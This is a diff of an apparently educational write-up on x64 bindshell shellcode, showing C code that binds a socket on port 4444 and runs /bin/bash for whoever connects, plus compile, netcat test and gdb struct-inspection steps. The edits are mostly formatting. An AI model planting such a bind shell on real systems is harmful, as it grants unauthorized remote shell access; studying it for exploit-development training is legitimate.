@@ -28,7 +28,6 @@ To better understand x64 shellcode, I first created a working bindshell in C.
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <stdlib.h>
-
 int main(void)
 {
   int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
@@ -46,6 +45,7 @@ int main(void)
   execve("/bin/bash", NULL, NULL);
 }
 ```
+
 ### Compile Shellcode
 ```bash
 root# uname -orm
@@ -64,7 +64,6 @@ root# ./bindshell
 root# nc 127.0.0.1 4444
 whoami
 root
-
 ```
 
 ### Function Analysis
@@ -72,13 +71,11 @@ root
 #### 1. Create a new Socket.
 
 ```c 
-int socket(int domain, int type, int protocol); 
-
-int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+socket(int domain, int type, int protocol); 
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP  );
 ```  
-+ For complete details see: `man socket`
 
-##### socket() parameters
+##### socket parameters
 
 ```c
 int domain = AF_INET
@@ -106,17 +103,15 @@ struct sockaddr_in {
 struct in_addr {
   uint32_t       s_addr;     /* address in network byte order */
 }; 
-
 struct sockaddr_in ipSocketAddr = { 
   .sin_family = AF_INET, 
   .sin_port = htons(4444), 
   .sin_addr.s_addr = htonl(INADDR_ANY) 
 };
 ```
-+ For complete details see: `man ip.7`  
-+ "An IP socket address is defined as a combination of an IP interface address and a 16-bit port number.
++ An IP socket address is defined as a combination of an IP interface address and a 16-bit port number.
 
-##### struct sockaddr\_in parameters
+##### struct sockaddr parameters
 
 ```c
 sa_family_t sin_family  = AF_INET
@@ -145,7 +140,7 @@ bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
 ```
 + For complete details see: `man bind`  
 
-##### bind() parameters
+##### bind parameters
 
 ```c
 sockfd = ipv4Socket
@@ -171,7 +166,7 @@ listen(ipv4Socket, 0);
 ```  
 + For complete details see: `man listen`  
 
-##### listen() Parameters
+##### listen Parameters
 
 ```c
 int sockfd  = ipv4Socket
@@ -191,7 +186,7 @@ int clientSocket = accept(ipv4Socket, NULL, NULL);
 ```  
 + For complete details see: `man accept`  
 
-##### accept() parameters
+##### accept parameters
 
 ```c
 int sockfd = ipv4Socket
@@ -328,11 +323,11 @@ gdb-peda$ run
 
 ##### RDI = 0x3 - int sockfd
 + returned from socket()
+
 ```bash 
 RDI: 0x3
 ```
 
-  
 ##### RSI = `const struct sockaddr *addr`
 ```bash 
 RSI: 0x7fffffffe130 --> 0x5c110002
@@ -349,6 +344,7 @@ RDX: 0x10
 + 0x10 is 16 bytes 
 
 + Mod bindshell.c
+
 ```c
     struct sockaddr_in ipSocketAddr = {
         .sin_family = AF_INET,
@@ -358,6 +354,7 @@ RDX: 0x10
 ```
 
 + Compile & investigate changes:
+
 ```bash
 root# gcc bindshell.c -o bshell2
 root# gdb ./bshell2
@@ -381,21 +378,22 @@ gdb-peda$ hexdump 0x00007fffffffe130 16
 
 ```bash 
 gdb-peda$ hexdump 0x00007fffffffe134 4
-0x00007fffffffe134 : 40 80 80 c1                                       @...
+0x00007fffffffe134 : 40 80 80 c1
 ```
 
 ```bash 
-# The 16 byte struct for the `sockaddr_in`
+# The 16 byte struct for the sockaddr_in
          02 00 11 5c 40 80 80 c1 00 00 00 00 00 00 00 00
 Address-Family| PORT| IP Address| 8 bytes of unused space in IPv4?
 ```
 
 + `man bind` shows that the sockaddr stuct is 16 bytes which is what we see from inspecting the assembly.
+
 ```c
-           struct sockaddr {
-               sa_family_t sa_family;
-               char        sa_data[14];
-           }
+struct sockaddr {
+  sa_family_t sa_family;
+  char        sa_data[14];
+}
 ```
 
 # Bindshell Assembly
